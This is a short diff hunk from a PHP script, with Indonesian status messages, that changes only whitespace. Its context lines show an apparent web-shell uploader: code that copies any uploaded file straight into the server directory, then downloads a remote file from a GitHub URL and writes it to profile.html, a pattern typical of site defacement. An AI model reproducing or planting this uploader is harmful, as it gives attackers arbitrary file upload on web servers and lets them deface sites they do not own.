@@ -14,7 +14,7 @@ if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploa
 else { echo '<b>Yah sayang uploadnya gagal pak, cari cara lain lagi ya :(</b><br><br>'; }
 
 }
- 
+    
     $prof = "https://raw.githubusercontent.com/IDTT/Js/master/profile.txt";
     $crot = file_get_contents($prof);
     $open = fopen("profile.html" , 'w');
